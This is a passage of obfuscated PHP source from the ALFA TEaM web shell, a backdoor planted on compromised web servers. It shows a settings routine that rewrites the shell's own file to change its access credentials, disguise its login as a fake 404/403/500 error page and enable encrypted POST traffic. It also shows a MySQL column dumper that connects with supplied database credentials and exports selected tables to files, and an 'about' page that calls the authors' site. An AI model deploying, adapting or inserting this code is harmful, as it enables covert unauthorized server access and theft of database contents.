foreach($yesqidvyf0d722d106665c8f1db553d507140848 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)$lbsfntjsb65581e7ecc28dd2657cc0a374aa555c .= '<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'" '.($GLOBALS['DB_NAME']['safemode']=='1'?'selected':'').'>'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>';
foreach($yesqidvyf0d722d106665c8f1db553d507140848 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)$ttwwrvsa111778af60cb1093cf33144d64cd3f29 .= '<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'" '.($GLOBALS['DB_NAME']['show_icons']=='1'?'selected':'').'>'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>';
foreach($gkzajztu7904b9622e24a4786d4f34a348e88997 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)$cjnewkuz92666816abf61a64c2aa2a5c00286c55 .= '<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'" '.(!empty($_POST['alfa9'])&&$_POST['alfa9']==$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d?"selected":($GLOBALS["DB_NAME"]["cgi_api"]&&empty($_POST['alfa9'])?'selected':'')).'>'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>';
foreach($gkzajztu7904b9622e24a4786d4f34a348e88997 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)$zfynbafa89916c6dc3576acb72931b354faf1ccd .= '<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'" '.(!empty($_POST['alfa7'])&&$_POST['alfa7']==$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d?"selected":(__ALFA_POST_ENCRYPTION__&&empty($_POST['alfa7'])?'selected':'')).'>'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>';
$yesqidvyf0d722d106665c8f1db553d507140848 = array("gui"=>"GUI","500"=>"500 Internal Server Error","403"=>"403 Forbidden","404"=>"404 NotFound");
foreach($yesqidvyf0d722d106665c8f1db553d507140848 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)$ezsffanbe4ac821fee9d2c94c01acda0244a254f .= '<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'" '.($GLOBALS['DB_NAME']['login_page']==$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d?'selected':'').'>'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>';
echo '';
echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$lbsfntjsb65581e7ecc28dd2657cc0a374aa555c.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cjnewkuz92666816abf61a64c2aa2a5c00286c55.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$zfynbafa89916c6dc3576acb72931b354faf1ccd.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$ttwwrvsa111778af60cb1093cf33144d64cd3f29.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$ezsffanbe4ac821fee9d2c94c01acda0244a254f.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['alfa3'])?$GLOBALS['DB_NAME']['user']:$_POST['alfa3']).'" placeholder="solevisible"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
if($_POST['alfa5']=='>>'){
echo __pre();
if(!empty($_POST['alfa3'])){
$tpoirzry124c16e5bae30d956b37ef14c9a00ab4 = $_POST['alfa1'];
$kvfnbqtn60f1901b22fb92ab95d93df632912ab5 = $_POST['alfa2'];
$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa3'];
$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = md5($_POST['alfa4']);
$pzbnrxfobaec6461b0d69dde1b861aefbe375d8a = $_POST['alfa6'];
$edkasmem72e68941819905c4f1b0d191678b6dbd = $_POST['alfa7'];
$nctzdszp17e4e3bd35ff08d25b44fe46bad7ab02 = $_POST['alfa9'];
@chdir($GLOBALS['home_cwd']);
$reppeyoy954eb83bca864c64ee1e669dfab01c95 = @basename($_SERVER['PHP_SELF']);
$sfmsaibm8d777f385d3dfec8815d20f7496026dc = @file_get_contents($reppeyoy954eb83bca864c64ee1e669dfab01c95);
$wglifhps2e6f15f729aed69599b7ab9704b03e44 = $GLOBALS["DB_NAME"]["user_rand"];
$mlmshhzj9c38b2924242facfa64af07983f64366 = $GLOBALS["DB_NAME"]["pass_rand"];
$gtmmwdpt6ee674eef2fabf34f10648c251d6fe60 = $GLOBALS["DB_NAME"]["login_page_rand"];
$nagxwcsv3eac9343fae7d4e4305eff4c76e9a139 = $GLOBALS["DB_NAME"]["safemode_rand"];
$wwpfrkpib03e6ab3a4a73af73f455f914bd51bcb = $GLOBALS["DB_NAME"]["show_icons_rand"];
$xprffgbw0adab3195ad5c84e053861c5143a0a9f = $GLOBALS["DB_NAME"]["post_encryption_rand"];
$zbrxlvyh81280b1f794423ff3fd3bb550cd87fbd = $GLOBALS["DB_NAME"]["cgi_api_rand"];
$ajswzkvz9889c9452a6e4e9c2a2455478687bd73 = '/\''.$wglifhps2e6f15f729aed69599b7ab9704b03e44.'\'(.*?),/i';
$ozdqfsiud62cc31cc62ad4b8c563338e09281413 = '/\''.$mlmshhzj9c38b2924242facfa64af07983f64366.'\'(.*?),/i';
$tfrmesvf0b98e4f57d62ecb053048ddcbcacda69 = '/\''.$gtmmwdpt6ee674eef2fabf34f10648c251d6fe60.'\'(.*?),/i';
$wblrmemte14b96d0aa2c2896bd32cdb9dea06b5a = '/\''.$nagxwcsv3eac9343fae7d4e4305eff4c76e9a139.'\'(.*?),/i';
$wzabiadibd21190449b7e88db48fa0f580a8f666 = '/\''.$wwpfrkpib03e6ab3a4a73af73f455f914bd51bcb.'\'(.*?),/i';
$pzlhelao3a742c88125fe704ce7326ddaa49ea05 = '/\''.$xprffgbw0adab3195ad5c84e053861c5143a0a9f.'\'(.*?),/i';
$rwshrtyg4bbb039c69f322d6e3bb3c330f589176 = '/\''.$zbrxlvyh81280b1f794423ff3fd3bb550cd87fbd.'\'(.*?),/i';
if(!empty($rgusbycx14c4b06b824ec593239362517f538b29)&&preg_match($ajswzkvz9889c9452a6e4e9c2a2455478687bd73,$sfmsaibm8d777f385d3dfec8815d20f7496026dc,$qxcuilgde1671797c52e15f763380b45e841ec32)){
$kcirdejs22af645d1859cb5ca6da0c484f1f37ea = '\''.$wglifhps2e6f15f729aed69599b7ab9704b03e44.'\' => \''.$rgusbycx14c4b06b824ec593239362517f538b29.'\',';
$sfmsaibm8d777f385d3dfec8815d20f7496026dc = str_replace($qxcuilgde1671797c52e15f763380b45e841ec32[0],$kcirdejs22af645d1859cb5ca6da0c484f1f37ea,$sfmsaibm8d777f385d3dfec8815d20f7496026dc);
}
if(!empty($_POST['alfa4'])&&preg_match($ozdqfsiud62cc31cc62ad4b8c563338e09281413,$sfmsaibm8d777f385d3dfec8815d20f7496026dc,$qxcuilgde1671797c52e15f763380b45e841ec32)){
$kcirdejs22af645d1859cb5ca6da0c484f1f37ea = '\''.$mlmshhzj9c38b2924242facfa64af07983f64366.'\' => \''.$oimndblx5f4dcc3b5aa765d61d8327deb882cf99.'\',';
$sfmsaibm8d777f385d3dfec8815d20f7496026dc = str_replace($qxcuilgde1671797c52e15f763380b45e841ec32[0],$kcirdejs22af645d1859cb5ca6da0c484f1f37ea,$sfmsaibm8d777f385d3dfec8815d20f7496026dc);
}
if(!empty($kvfnbqtn60f1901b22fb92ab95d93df632912ab5)&&preg_match($tfrmesvf0b98e4f57d62ecb053048ddcbcacda69,$sfmsaibm8d777f385d3dfec8815d20f7496026dc,$qxcuilgde1671797c52e15f763380b45e841ec32)){
$kcirdejs22af645d1859cb5ca6da0c484f1f37ea = '\''.$gtmmwdpt6ee674eef2fabf34f10648c251d6fe60.'\' => \''.$kvfnbqtn60f1901b22fb92ab95d93df632912ab5.'\',';
$sfmsaibm8d777f385d3dfec8815d20f7496026dc = str_replace($qxcuilgde1671797c52e15f763380b45e841ec32[0],$kcirdejs22af645d1859cb5ca6da0c484f1f37ea,$sfmsaibm8d777f385d3dfec8815d20f7496026dc);
}
if(!empty($wblrmemte14b96d0aa2c2896bd32cdb9dea06b5a)&&preg_match($wblrmemte14b96d0aa2c2896bd32cdb9dea06b5a,$sfmsaibm8d777f385d3dfec8815d20f7496026dc,$qxcuilgde1671797c52e15f763380b45e841ec32)){
$kcirdejs22af645d1859cb5ca6da0c484f1f37ea = '\''.$nagxwcsv3eac9343fae7d4e4305eff4c76e9a139.'\' => \''.$tpoirzry124c16e5bae30d956b37ef14c9a00ab4.'\',';
$sfmsaibm8d777f385d3dfec8815d20f7496026dc = str_replace($qxcuilgde1671797c52e15f763380b45e841ec32[0],$kcirdejs22af645d1859cb5ca6da0c484f1f37ea,$sfmsaibm8d777f385d3dfec8815d20f7496026dc);
}
if(preg_match($wzabiadibd21190449b7e88db48fa0f580a8f666,$sfmsaibm8d777f385d3dfec8815d20f7496026dc,$qxcuilgde1671797c52e15f763380b45e841ec32)){
$kcirdejs22af645d1859cb5ca6da0c484f1f37ea = '\''.$wwpfrkpib03e6ab3a4a73af73f455f914bd51bcb.'\' => \''.$pzbnrxfobaec6461b0d69dde1b861aefbe375d8a.'\',';
$sfmsaibm8d777f385d3dfec8815d20f7496026dc = str_replace($qxcuilgde1671797c52e15f763380b45e841ec32[0],$kcirdejs22af645d1859cb5ca6da0c484f1f37ea,$sfmsaibm8d777f385d3dfec8815d20f7496026dc);
}
if(preg_match($pzlhelao3a742c88125fe704ce7326ddaa49ea05,$sfmsaibm8d777f385d3dfec8815d20f7496026dc,$qxcuilgde1671797c52e15f763380b45e841ec32)){
$kcirdejs22af645d1859cb5ca6da0c484f1f37ea = '\''.$xprffgbw0adab3195ad5c84e053861c5143a0a9f.'\' => '.$edkasmem72e68941819905c4f1b0d191678b6dbd.',';
$sfmsaibm8d777f385d3dfec8815d20f7496026dc = str_replace($qxcuilgde1671797c52e15f763380b45e841ec32[0],$kcirdejs22af645d1859cb5ca6da0c484f1f37ea,$sfmsaibm8d777f385d3dfec8815d20f7496026dc);
}
if(preg_match($rwshrtyg4bbb039c69f322d6e3bb3c330f589176,$sfmsaibm8d777f385d3dfec8815d20f7496026dc,$qxcuilgde1671797c52e15f763380b45e841ec32)){
$kcirdejs22af645d1859cb5ca6da0c484f1f37ea = '\''.$zbrxlvyh81280b1f794423ff3fd3bb550cd87fbd.'\' => '.$nctzdszp17e4e3bd35ff08d25b44fe46bad7ab02.',';
$sfmsaibm8d777f385d3dfec8815d20f7496026dc = str_replace($qxcuilgde1671797c52e15f763380b45e841ec32[0],$kcirdejs22af645d1859cb5ca6da0c484f1f37ea,$sfmsaibm8d777f385d3dfec8815d20f7496026dc);
}
if(@file_put_contents($reppeyoy954eb83bca864c64ee1e669dfab01c95,$sfmsaibm8d777f385d3dfec8815d20f7496026dc)){
echo '<b>UserName: </b><font color="green"><b>'.$rgusbycx14c4b06b824ec593239362517f538b29.'</b></font><br /><b>Password: </b><font color="green"><b>'.$_POST['alfa4'].'</b></font><script>post_encryption_mode = '.$edkasmem72e68941819905c4f1b0d191678b6dbd.';</script>';
}else{
__alert("<span style='color:red;'>File has no edit access...!</span>");
}
}else{
__alert("<span style='color:red;'>UserName is Empty !</span>");
}
}
}elseif($_POST["alfa8"] == "color"){
echo('<center><p><div class="txtfont_header">| Custom Color |</div></p><form onSubmit="reloadColors();return false;" method=\'post\'>');
echo '<table border="1"><tbody>';
$gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6 = '<tr><td style="text-align:center;"><a href="http://solevisible.com/customcolors/{help}.png" target="_blank"><font color="#00FF00">Help</font></a></td><td style="text-align:center;"><div class="tbltxt">{index}</div></td><td><div class="tbltxt" style="margin-left:5px;">{target}:</div></td><td><input style="width:60px;" multi="{multi}" id="gui_{target}" onChange="colorHandler(this);" target=".{target}" type="color" value="{color}"></td><td><input type="text" style="text-align:center;" multi="{multi}" onkeyup="colorHandlerKey(this);" target=".{target}" id="input_{target}" class="colors_input" placeholder="#ffffff" value="{color}"></td></tr>';
$fyyftmba9dd4e461268c8034f5c8564e155c67a6 = 1;
foreach($GLOBALS['__ALFA_COLOR__'] as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804){
	$opnkqlyaea8f243d9885cf8ce9876a580224fd3c = "";
	if(is_array($rkptsoeg2063c1608d6e0baf80249c42e2be5804)){
		if(isset($rkptsoeg2063c1608d6e0baf80249c42e2be5804["multi_selector"])){
			$opnkqlyaea8f243d9885cf8ce9876a580224fd3c = __ZW5jb2Rlcg(json_encode($rkptsoeg2063c1608d6e0baf80249c42e2be5804));
		}
	}
	$rkptsoeg2063c1608d6e0baf80249c42e2be5804 = alfa_getColor($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d);
	$hjczuzba657f8b8da628ef83cf69101b6817150a = strtolower(str_replace(array(":", "+"), array("_", "_plus"), $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d));
	echo str_replace(array("{index}", "{target}", "{color}", "{multi}", "{help}"), array($fyyftmba9dd4e461268c8034f5c8564e155c67a6++, $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, $rkptsoeg2063c1608d6e0baf80249c42e2be5804, $opnkqlyaea8f243d9885cf8ce9876a580224fd3c, $hjczuzba657f8b8da628ef83cf69101b6817150a), $gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6);
}
echo '<tr><td style="text-align:center;">-</td><td style="text-align:center;"><div class="tbltxt">*</div></td><td><div style="margin-left:5px;" class="tbltxt">Use Default Color:</div></td><td></td><td><center><input type="checkbox" id="use_default_color" value="1"></center></td></tr>';

echo '</tbody></table><p><input type="submit" name="btn" value=" "></p></form><p><button style="padding:4px;;margin-right:20px;" onclick="$(\'importFileBtn\').click();"class="button"> Import </button> <button style="padding:4px;margin-left:20px;" onclick="g(\'settings\',null,null,null,null,null,null,null,\'export\',\'color\')" class="button"> Export </button></center></p>';
if($_POST['alfa7']=='export'){
	echo __pre();
	$qeleebga62848e3ce5804aa985513a7922ff87b2 = is_array($GLOBALS["DB_NAME"]["color"])?$GLOBALS["DB_NAME"]["color"]:array();
	$ixhxbzub2ce01a24556db85e099b3ed4a58d4f94 = $GLOBALS["__ALFA_COLOR__"];
	$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5 = array();
	foreach($ixhxbzub2ce01a24556db85e099b3ed4a58d4f94 as $damiszkt8ce4b16b22b58894aa86c421e8759df3 => $hvlrcxnj9e3669d19b675bd57058fd4664205d2a){
		if(isset($qeleebga62848e3ce5804aa985513a7922ff87b2[$damiszkt8ce4b16b22b58894aa86c421e8759df3])&&!empty($qeleebga62848e3ce5804aa985513a7922ff87b2[$damiszkt8ce4b16b22b58894aa86c421e8759df3])&&!$ncztovoqf62baf4c4ead98d50d516eca0ac5a746){
			$hvlrcxnj9e3669d19b675bd57058fd4664205d2a = trim($qeleebga62848e3ce5804aa985513a7922ff87b2[$damiszkt8ce4b16b22b58894aa86c421e8759df3]);
		}else{
			$hvlrcxnj9e3669d19b675bd57058fd4664205d2a = trim(is_array($hvlrcxnj9e3669d19b675bd57058fd4664205d2a)?$hvlrcxnj9e3669d19b675bd57058fd4664205d2a["key_color"]:$hvlrcxnj9e3669d19b675bd57058fd4664205d2a);
		}
		$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5[$damiszkt8ce4b16b22b58894aa86c421e8759df3] = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a;
	}
	$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = "alfa_color_config_".date('Y-m-d-h_i_s').".conf";
	$yzrzmzyl2245023265ae4cf87d02c8b6ba991139 = json_encode($vmwhayoqf1f713c9e000f5d3f280adbd124df4f5, JSON_PRETTY_PRINT);
	if(!@file_put_contents($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $yzrzmzyl2245023265ae4cf87d02c8b6ba991139)){
		echo('<p><center>Color Config:<br><br><textarea rows="12" cols="70" type="text">'.$yzrzmzyl2245023265ae4cf87d02c8b6ba991139.'</textarea></center></p>');
	}else{
		echo('<h3><p><center><a class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac.'\', \'download\')"><font color="#0F0">Download Config</font></a></center></p></h3>');
	}
}
if($_POST['alfa2']=='>>'){
	echo __pre();
	$qeleebga62848e3ce5804aa985513a7922ff87b2 = json_decode($_POST["alfa1"],true);
	$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5 = "";
	$ncztovoqf62baf4c4ead98d50d516eca0ac5a746 = isset($_POST["alfa3"])&&$_POST["alfa3"]=="1"?true:false;
	$ixhxbzub2ce01a24556db85e099b3ed4a58d4f94 = $GLOBALS["__ALFA_COLOR__"];
	foreach($ixhxbzub2ce01a24556db85e099b3ed4a58d4f94 as $damiszkt8ce4b16b22b58894aa86c421e8759df3 => $hvlrcxnj9e3669d19b675bd57058fd4664205d2a){
		if(isset($qeleebga62848e3ce5804aa985513a7922ff87b2[$damiszkt8ce4b16b22b58894aa86c421e8759df3])&&!empty($qeleebga62848e3ce5804aa985513a7922ff87b2[$damiszkt8ce4b16b22b58894aa86c421e8759df3])&&!$ncztovoqf62baf4c4ead98d50d516eca0ac5a746){
			$hvlrcxnj9e3669d19b675bd57058fd4664205d2a = trim($qeleebga62848e3ce5804aa985513a7922ff87b2[$damiszkt8ce4b16b22b58894aa86c421e8759df3]);
		}else{
			$hvlrcxnj9e3669d19b675bd57058fd4664205d2a = trim(is_array($hvlrcxnj9e3669d19b675bd57058fd4664205d2a)?$hvlrcxnj9e3669d19b675bd57058fd4664205d2a["key_color"]:$hvlrcxnj9e3669d19b675bd57058fd4664205d2a);
		}
		$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5 .= '"'.trim($damiszkt8ce4b16b22b58894aa86c421e8759df3).'" => "'.$hvlrcxnj9e3669d19b675bd57058fd4664205d2a.'",';
	}
	@chdir($GLOBALS['home_cwd']);
	$reppeyoy954eb83bca864c64ee1e669dfab01c95 = @basename($_SERVER['PHP_SELF']);
	$sfmsaibm8d777f385d3dfec8815d20f7496026dc = @file_get_contents($reppeyoy954eb83bca864c64ee1e669dfab01c95);
	$jnvdsdtk70dda5dfb8053dc6d1c492574bce9bfd = '/\'color\'(.*?)\),/s';
	if(preg_match($jnvdsdtk70dda5dfb8053dc6d1c492574bce9bfd,$sfmsaibm8d777f385d3dfec8815d20f7496026dc,$qxcuilgde1671797c52e15f763380b45e841ec32)){
		$kcirdejs22af645d1859cb5ca6da0c484f1f37ea = "'color' => array(".$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5."),";
		$sfmsaibm8d777f385d3dfec8815d20f7496026dc = str_replace($qxcuilgde1671797c52e15f763380b45e841ec32[0],$kcirdejs22af645d1859cb5ca6da0c484f1f37ea,$sfmsaibm8d777f385d3dfec8815d20f7496026dc);
		if(@file_put_contents($reppeyoy954eb83bca864c64ee1e669dfab01c95, $sfmsaibm8d777f385d3dfec8815d20f7496026dc)){
			echo("<center><p><h3>[+] Success...</h3></p></center><script>location.reload();</script>");
		}else{
			echo("<center><p><h3>[-] We Not have permission to Edit shell...!</h3></p></center>");
		}
	}else{
		echo("<center><p><h3>[-] Error...!</h3></p></center>");
	}
}
}
echo('</div>');
alfafooter();
}
function alfaaboutus(){
alfahead();
echo '<div class="header">';
$fwuutsgy508c75c8507a2ae5223dfd2faeb98122 = new AlfaCURL();
$mmbpvkfr54b9a8865a965755ad90cdab15541375 = $fwuutsgy508c75c8507a2ae5223dfd2faeb98122->Send("http://solevisible.com/aboutus.php");
if(empty($mmbpvkfr54b9a8865a965755ad90cdab15541375)){
$mmbpvkfr54b9a8865a965755ad90cdab15541375 = "<pre><center><img src='http://solevisible.com/images/farvahar-iran.png'><br>
<b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
<font color='#00A220'>Shell Coded By Sole Sad & Invisible (ALFA TEaM)</font><br>
<font color='#00A220'>Contact : solevisible@gmail.com</font><br>
<font color='#00A220'>Telegram Channel: @solevisible</font><br>
<font color='#FFFFFF'>Skype : ehsan.invisible</font><br>
<font color='#FFFFFF'>Skype : sole.sad</font><br>
<font color='#FF0000'>Persian Gulf For Ever</font><br>
<font color='#FF0000'>Iranian Programmers</font><br>
<font color='#FF0000'>############</font><br>
</center></pre><iframe src='tg://resolve?domain=solevisible' frameborder='0' width='0' height='0'></iframe>";
}
echo __pre().$mmbpvkfr54b9a8865a965755ad90cdab15541375;
echo('</div>');
alfafooter();
}
function alfacoldumper(){
alfahead();
echo('<div class="header">');
AlfaNum(8,9,10);
echo "<center><br><div class='txtfont_header'>| Mysql Column Dumper |</div><br><br>".getConfigHtml('all')."<form method='post' onsubmit=\"var opt_id=this.getAttribute('opt_id');var delimiter='json';try{if($('dumper-delimiter-type').value == 'delimiter')delimiter=$('dumper-delimiter-input').value}catch(e){};g('coldumper',null,delimiter,JSON.stringify(col_dumper_selected_data[opt_id]),this.db_username.value,this.db_password.value,this.db_name.value,this.dfile.value,this.db_host.value); col_dumper_selected_data[opt_id] = {};return false;\"><p>";
$surovjlf528d3a0db57c788c744aed5a2ee9f5c8 = (!empty($_POST['alfa1']) ? $_POST['alfa1'] : '::');
$nppckjho0aec3cb72f6201bec9e9eb5ccbe4d677 = json_decode($_POST['alfa2'], true);
$rgusbycx14c4b06b824ec593239362517f538b29 = ($_POST['alfa3']);
$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = ($_POST['alfa4']);
$pghnyjea4cd4a49f25984e26fe708c1fbd896653 = ($_POST['alfa5']);
$abgylnfza1f8694b087d3fa0f4f6abbd6725aa3b = ($_POST['alfa6']);
$wlerpykf67b3dba8bc6778101892eb77249db32e = ($_POST['alfa7']);
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => $wlerpykf67b3dba8bc6778101892eb77249db32e, 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => $rgusbycx14c4b06b824ec593239362517f538b29, 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => $oimndblx5f4dcc3b5aa765d61d8327deb882cf99, 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => $pghnyjea4cd4a49f25984e26fe708c1fbd896653, 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Output Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']), 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
$dhkkpmvsd77d5e503ad1439f585ac494268b351b = false;
if(!empty($pghnyjea4cd4a49f25984e26fe708c1fbd896653)){
	$dhkkpmvsd77d5e503ad1439f585ac494268b351b = @mysqli_connect($wlerpykf67b3dba8bc6778101892eb77249db32e, $rgusbycx14c4b06b824ec593239362517f538b29, $oimndblx5f4dcc3b5aa765d61d8327deb882cf99, $pghnyjea4cd4a49f25984e26fe708c1fbd896653);
}
if(count($nppckjho0aec3cb72f6201bec9e9eb5ccbe4d677) > 0){
	if($dhkkpmvsd77d5e503ad1439f585ac494268b351b){
		if(!is_dir($abgylnfza1f8694b087d3fa0f4f6abbd6725aa3b)){
			$abgylnfza1f8694b087d3fa0f4f6abbd6725aa3b = $GLOBALS['cwd'];
		}
		$ylslqkgi1e64588c114878138fcc7545ef5debcb = "";
		$uzehrcsaabf77184f55403d75b9d51d79162a7ca = '.txt';
		if($surovjlf528d3a0db57c788c744aed5a2ee9f5c8 == 'json'){
			$uzehrcsaabf77184f55403d75b9d51d79162a7ca = '.json';
		}
		foreach ($nppckjho0aec3cb72f6201bec9e9eb5ccbe4d677 as $msskzybbe6d037be0f9413ca1751cce755f342ab => $pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19) {
			$ctphgqnvb9b0a6b5d256ebaf403659bbc2111742 = mysqli_query($dhkkpmvsd77d5e503ad1439f585ac494268b351b, "SELECT ".implode(',', $pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19)." FROM $msskzybbe6d037be0f9413ca1751cce755f342ab");
			$fbnucizz3090ad88ff7c9ca191579b709069fe64 = $abgylnfza1f8694b087d3fa0f4f6abbd6725aa3b.'/'.$pghnyjea4cd4a49f25984e26fe708c1fbd896653.'.'.$msskzybbe6d037be0f9413ca1751cce755f342ab.$uzehrcsaabf77184f55403d75b9d51d79162a7ca;
			$zngnwtjj0666f0acdeed38d4cd9084ade1739498 = fopen($fbnucizz3090ad88ff7c9ca191579b709069fe64, "w");
			$sfmsaibm8d777f385d3dfec8815d20f7496026dc = array();
			while($belwysnaf1965a857bc285d26fe22023aa5ab50d = mysqli_fetch_array($ctphgqnvb9b0a6b5d256ebaf403659bbc2111742, MYSQLI_ASSOC)){
				if($surovjlf528d3a0db57c788c744aed5a2ee9f5c8 == "json"){
					$wwlyinkm8aed44a4bf4e71f0a28c6a7e8c1f3e39 = array();
					foreach ($belwysnaf1965a857bc285d26fe22023aa5ab50d as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804) {
						if(empty($rkptsoeg2063c1608d6e0baf80249c42e2be5804)){
							$rkptsoeg2063c1608d6e0baf80249c42e2be5804 = "[empty]";
						}
						 $wwlyinkm8aed44a4bf4e71f0a28c6a7e8c1f3e39[$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
					}
					$sfmsaibm8d777f385d3dfec8815d20f7496026dc[$msskzybbe6d037be0f9413ca1751cce755f342ab][] = $wwlyinkm8aed44a4bf4e71f0a28c6a7e8c1f3e39;
				}else{
					$sfmsaibm8d777f385d3dfec8815d20f7496026dc = "";
					foreach ($belwysnaf1965a857bc285d26fe22023aa5ab50d as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804) {
						if(empty($rkptsoeg2063c1608d6e0baf80249c42e2be5804)){
							$rkptsoeg2063c1608d6e0baf80249c42e2be5804 = "[empty]";
						}
						$sfmsaibm8d777f385d3dfec8815d20f7496026dc .= $rkptsoeg2063c1608d6e0baf80249c42e2be5804 . $surovjlf528d3a0db57c788c744aed5a2ee9f5c8;
					}
					fwrite($zngnwtjj0666f0acdeed38d4cd9084ade1739498, $sfmsaibm8d777f385d3dfec8815d20f7496026dc ."\n");
				}
			}
			if($surovjlf528d3a0db57c788c744aed5a2ee9f5c8 == "json"){
				fwrite($zngnwtjj0666f0acdeed38d4cd9084ade1739498, json_encode($sfmsaibm8d777f385d3dfec8815d20f7496026dc));
			}
			fclose($zngnwtjj0666f0acdeed38d4cd9084ade1739498);
			$ylslqkgi1e64588c114878138fcc7545ef5debcb .= "Done ~~~> ".$fbnucizz3090ad88ff7c9ca191579b709069fe64."<br>";
		}
		echo __pre();
		echo "<center><font color='#00FF00'>".$ylslqkgi1e64588c114878138fcc7545ef5debcb."</font></center>";
	}
}
if(!empty($pghnyjea4cd4a49f25984e26fe708c1fbd896653) && count($nppckjho0aec3cb72f6201bec9e9eb5ccbe4d677) == 0){
//echo __pre();
if($dhkkpmvsd77d5e503ad1439f585ac494268b351b){
	echo("<hr><div style='text-align:center;margin-bottom:5px;font-weight:bolder;'><span>[ Select your tables and columns for dumping data ]</span></div>");
	echo("<div style='text-align:center;'><span>Output Type: </span><select id='dumper-delimiter-type' onchange='colDumplerSelectType(this);' name='output_type'><option value='delimiter' selected>delimiter</option><option value='json'>json</option></select><div id='coldumper-delimiter-input' style='display:inline;'><span> Delimiter: </span><input id='dumper-delimiter-input' style='text-align:center;' type='text' name='delimiter' placeholder='eg: ,'></div></div>");
	$sfmsaibm8d777f385d3dfec8815d20f7496026dc = array();
